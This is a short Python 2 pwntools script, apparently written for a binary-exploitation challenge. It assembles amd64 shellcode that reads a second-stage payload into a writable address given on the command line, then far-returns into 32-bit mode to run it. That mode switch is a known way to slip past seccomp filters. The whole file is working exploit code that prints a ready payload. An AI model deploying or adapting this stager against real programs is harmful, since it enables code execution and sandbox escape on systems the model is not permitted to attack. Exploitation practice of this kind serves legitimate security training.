#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

# 引数に書き込み可能なアドレス(例えばbssのアドレス)を指定する
n1 = int(sys.argv[1], 16)+0x860
n2 = int(sys.argv[1], 16)+0x890
#print "%08x, %08x" % (n1, n2)

sc  = ""
sc += "mov rax, 0\n"
sc += "xor rdi, rdi\n"
sc += "mov rsi, 0x"+("%08x" % n2)+"\n"
sc += "mov rdx, 0x80\n"
sc += "syscall\n"
sc += "mov esp, 0x"+("%08x" % n1)+"\n"
sc += "mov DWORD PTR [esp+4], 0x23\n"
sc += "mov DWORD PTR [esp], 0x"+("%08x" % n2)+"\n"
sc += "retf\n"

payload = asm(sc, os='linux', arch='amd64')
print payload
